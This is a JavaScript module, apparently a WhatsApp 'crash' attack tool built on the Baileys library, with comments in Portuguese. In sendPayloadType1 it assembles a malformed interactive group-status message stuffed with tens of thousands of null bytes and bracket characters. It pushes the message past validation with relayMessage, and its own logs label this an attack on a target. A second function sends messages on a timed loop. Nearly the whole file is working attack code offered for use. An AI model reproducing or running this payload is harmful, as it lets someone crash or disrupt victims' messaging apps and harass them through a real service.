// actions.js - MODO BRUTO (SEM VALIDAÇÃO)
import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

/**
 * Função de delay para o seu loop não fritar o servidor
 */
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

async function sendPayloadType1(sock, target) {
  try {
    console.log(`[DeepHat] 🔥 INICIANDO ATAQUE PESADO: ${target}`);

    // 1. SEU PAYLOAD ORIGINAL - SEM ALTERAR TAMANHO
    const cRb = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              bloksWidget: {
                fallback: "\u0000".repeat(10000),
                type: "\u0000".repeat(10000),
                data: "[".repeat(50000),
                uuid: "\u0000".repeat(10000),
              },
              title: "MakLo",
            },
            nativeFlowMessage: {
              buttons: [{}]
            },
            body: {
              text: "Mensagem de Sistema Enviada"
            },
          },
        },
      },
    };

    // 2. GERAÇÃO DO PACOTE BRUTO
    // Usamos o gerador para criar a estrutura, mas não vamos usar o método de envio padrão
    const msg = await generateWAMessageFromContent(target, cRb, { 
      presence: 'composing' 
    });

    // 3. INJEÇÃO BRUTA (BYPASS DE VALIDAÇÃO)
    // O relayMessage pula a verificação de 'media type' e joga o pacote direto no socket.
    // Isso é o que faz o seu payload de 50k caracteres passar sem o erro de 'Invalid media type'.
    await sock.relayMessage(target, msg.message, { 
      messageId: msg.key.id, 
      noSelfSync: true 
    });

    // O delay de 2 segundos que você viu no outro projeto para manter o loop vivo
    await sleep(2000);

    console.log("[DeepHat] ✅ Payload Injetado com Sucesso!");
    return { status: "sucesso", msg: "Payload enviado!" };

  } catch (error) {
    console.error("[DeepHat] ❌ ERRO NO ATAQUE:", error.message);
    // Mesmo no erro, espera 2s para o loop não travar o servidor
    await sleep(2000);
    return { status: "erro", msg: error.message };
  }
}

/**
 * Função de limpeza para o JID
 */
const forceSanitize = (jid) => {
  if (!jid) return null;
  const clean = jid.toString().replace(/\D/g, '');
  if (clean.length < 10) return null;
  return `${clean}@s.whatsapp.net`;
};

/**
 * AÇÃO 2 - CONFIGURADA PARA NÃO TRAVAR
 */
async function sendPayloadType2(sock, target, message) {
  try {
    console.log(`[DeepHat] Iniciando Ação 2: ${target}`);
    const cleanTarget = forceSanitize(target);

    if (!cleanTarget) throw new Error("Alvo inválido.");

    // Garante que a mensagem não vá nula (evita o erro de media type)
    const textToSend = (message && message.trim().length > 0) ? message : "Test";

    // Delay de 2s para o ritmo do loop
    await sleep(2000);

    // Envio direto
    await sock.sendMessage(cleanTarget, { text: textToSend });

    console.log(`[DeepHat] ✅ Ação 2 enviada!`);
    return { status: "sucesso", msg: "Mensagem enviada!" };
  } catch (error) {
    console.error("[DeepHat] ❌ ERRO AÇÃO 2:", error.message);
    await sleep(2000);
    return { status: "erro", msg: error.message };
  }
}

export { sendPayloadType1, sendPayloadType2 };